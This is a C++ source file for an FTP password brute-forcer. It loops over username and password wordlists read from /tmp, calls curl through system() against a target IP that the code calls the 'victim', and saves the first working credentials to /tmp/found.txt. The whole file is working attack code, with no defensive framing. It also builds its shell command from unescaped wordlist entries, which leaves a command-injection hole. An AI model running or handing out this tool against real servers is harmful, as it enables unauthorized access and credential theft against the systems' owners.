#include <iostream>
#include <fstream>
#include <vector>

/* Function that reads the specified file and returns a vector containing every line */
std::vector<std::string> load_file(std::string path){
    std::ifstream file(path);
    std::string word;
    std::vector<std::string> result;
    while(getline(file,word)){
        result.push_back(word);
    }
    file.close();
    return result;
}

/* Tries the login to the ftp server using the selected username and password */
int ftp_conn(std::string name, std::string pass, std::string ip_addr){
    std::string command = "curl -s --user "+name+":"+pass+" ftp://"+ip_addr+" > /dev/null 2>&1";
    return system(command.c_str());
}

/* Starting from common usernames and passwords, tries to login using ftp to the specified ip address */
int main(int argc, char* argv[]){
    if(argc < 2) exit(EXIT_FAILURE);
    std::string victim = argv[1];
    std::vector<std::string> names = load_file("/tmp/usernames.txt");
    std::vector<std::string> passwds = load_file("/tmp/passwords.txt");
    int status = 0;
    for(auto &n: names){
        std::cout << "trying username: " << n << std::endl;
        for(auto &pass: passwds){
            status = ftp_conn(n, pass, victim);
            if(status==0) {
                std::ofstream("/tmp/found.txt")<< n << ":" << pass << ":" << victim << std::endl;
                break;
            }
        }
        if(status==0) break;
    }
    return 0;
}